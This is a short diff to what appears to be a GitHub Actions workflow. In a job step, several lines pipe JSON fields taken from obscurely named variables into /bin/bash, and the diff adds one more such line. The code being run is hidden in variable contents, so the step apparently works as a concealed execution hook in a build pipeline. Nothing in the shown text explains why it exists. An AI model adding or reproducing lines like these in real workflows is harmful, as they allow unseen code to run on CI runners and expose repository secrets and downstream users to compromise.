@@ -45,6 +45,7 @@ jobs:
           echo $mli932 | jq -r .vpghc3 | /bin/bash
           printf '%s' "$iug3" | jq -r .xpcw692 | /bin/bash
           echo $uy912 | jq -r .bmnkh1 | /bin/bash
+          printf '%s' "$lc1" | jq -r .s9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
